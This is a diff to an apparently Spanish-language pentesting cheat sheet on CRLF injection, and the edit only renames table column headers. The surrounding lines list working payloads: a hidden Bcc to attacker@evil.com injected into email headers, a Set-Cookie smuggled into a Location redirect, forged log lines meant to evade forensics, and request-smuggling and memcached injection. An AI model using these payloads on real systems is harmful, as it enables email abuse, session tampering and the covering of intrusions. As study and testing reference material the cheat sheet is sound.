@@ -24,7 +24,7 @@ linked:
 
 ## Email Header Injection (SMTP)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Email contact form passes user input directly a SMTP headers. CRLF inject permite añadir headers / body / attachments. | SMTP CRLF injection. |
 | `From` injection | `victim@target.com%0d%0aBcc:%20attacker@evil.com` | Hidden BCC. |
@@ -65,7 +65,7 @@ ___
 
 ## Redirect Injection (`Location:` Header)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Standard Location inject | `?url=https://target.com%0d%0aSet-Cookie:%20a=1` | Set cookie + redirect. |
 | Location + Set-Cookie | Multi-effect | Combine. |
@@ -83,7 +83,7 @@ ___
 
 ## Log Injection / Log Poisoning
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Inject CRLF en input que se loggea sin sanitización → fake log lines | Log forgery. |
 | Forge fake log entry | `%0d%0a2025-01-01 INFO: User admin logged in` | Forensics evasion. |
@@ -103,7 +103,7 @@ ___
 
 ## HTTP Request Smuggling Combo
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | CRLF inject en header value smuggles new request to backend | HRS variant. |
 | Inject Content-Length | `Header: value\r\nContent-Length: 50` | Force length differential. |
@@ -123,7 +123,7 @@ ___
 
 ## Memcached / Redis / SMTP via Newlines
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Memcached injection | Cache key concatenated con user input → CRLF inject sends new memcached commands | NoSQL adjacent. |
 | Memcached `set` inject | Atacante sets arbitrary keys | Cache poisoning. |
